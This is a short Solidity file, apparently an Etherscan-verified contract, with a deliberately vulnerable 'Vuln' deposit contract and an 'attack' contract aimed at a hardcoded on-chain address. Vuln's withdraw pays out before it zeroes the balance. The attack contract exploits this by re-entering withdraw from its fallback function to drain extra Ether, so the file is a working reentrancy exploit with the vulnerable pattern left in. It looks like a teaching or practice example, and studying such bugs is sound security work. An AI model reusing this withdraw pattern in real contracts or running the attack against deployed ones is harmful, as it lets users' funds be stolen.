/**
 *Submitted for verification at Etherscan.io on 2021-12-05
*/

pragma solidity ^0.6.0;

contract Vuln 
{
    mapping(address => uint256) public balances;
    function deposit() public payable 
    {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public 
    {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");
        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract attack 
{
    address vuln_addr = 0x36A540E3A78084962B75E25877CfACf8846Be018;
    Vuln vuln_cont = Vuln(vuln_addr);
    uint256 count = 0;
    address owner;

    function gimmeGimme() public payable 
    {
        vuln_cont.deposit.value(0.01 ether)();
        vuln_cont.withdraw();
    }

    fallback () external payable 
    {
        if (count < 3)
        {
            count += 1;
            vuln_cont.withdraw();
        }
    }
}